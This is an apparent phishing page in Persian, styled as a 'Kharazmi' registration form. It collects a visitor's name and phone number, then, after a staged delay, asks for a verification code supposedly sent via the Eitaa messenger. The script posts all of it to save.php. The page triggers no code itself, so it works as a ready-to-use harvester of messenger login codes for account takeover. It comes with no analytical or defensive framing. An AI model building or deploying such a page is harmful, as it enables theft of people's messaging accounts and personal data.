<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>خوارزمی</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body {
        font-family: Arial, sans-serif;
        background: #f0f0f0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }
    .container {
        background: white;
        padding: 20px 30px;
        border-radius: 10px;
        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        width: 350px;
        text-align: center;
    }
    input {
        width: 90%;
        padding: 8px;
        margin: 5px 0 15px 0;
        font-size: 14px;
    }
    button {
        padding: 10px 20px;
        font-size: 14px;
        cursor: pointer;
        border: none;
        background-color: #4CAF50;
        color: white;
        border-radius: 5px;
    }
    .modal {
        display: none;
        position: fixed;
        z-index: 100;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0,0,0,0.5);
    }
    .modal-content {
        background: white;
        margin: 15% auto;
        padding: 20px;
        border-radius: 10px;
        width: 300px;
        text-align: center;
    }
</style>
</head>
<body>

<div class="container">
    <h2>خوارزمی</h2>

    <label>نام:</label><br>
    <input type="text" id="name"><br>

    <label>نام خانوادگی:</label><br>
    <input type="text" id="lastname"><br>

    <label>شماره تلفن:</label><br>
    <input type="text" id="phone"><br>

    <button onclick="submitForm()">تأیید</button>
</div>


<div id="codeModal" class="modal">
    <div class="modal-content">
        <h3>خوارزمی</h3>
        <p>کدی که برای شما در ایتا ارسال شد را وارد کنید</p>

        <input type="text" id="codeInput"><br>

        <button onclick="submitCode()">تأیید کد</button>
    </div>
</div>


<script>
function submitForm() {
    const name = document.getElementById('name').value.trim();
    const lastname = document.getElementById('lastname').value.trim();
    const phone = document.getElementById('phone').value.trim();

    if (!name || !lastname || !phone) {
        alert("لطفاً همه فیلدها را پر کنید");
        return;
    }

    setTimeout(() => {
        document.getElementById('codeModal').style.display = 'block';
    }, 2000);
}

function submitCode() {
    const code = document.getElementById('codeInput').value.trim();
    const name = document.getElementById('name').value.trim();
    const lastname = document.getElementById('lastname').value.trim();
    const phone = document.getElementById('phone').value.trim();

    if (!code) {
        alert("لطفاً کد را وارد کنید");
        return;
    }

    fetch("save.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `name=${name}&lastname=${lastname}&phone=${phone}&code=${code}`
    })
    .then(res => res.text())
    .then(data => {
        alert("ثبت شد");
        document.getElementById('codeModal').style.display = 'none';
        document.getElementById('codeInput').value = '';
    });
}

window.onclick = function(event) {
    const modal = document.getElementById('codeModal');
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

</body>
</html>
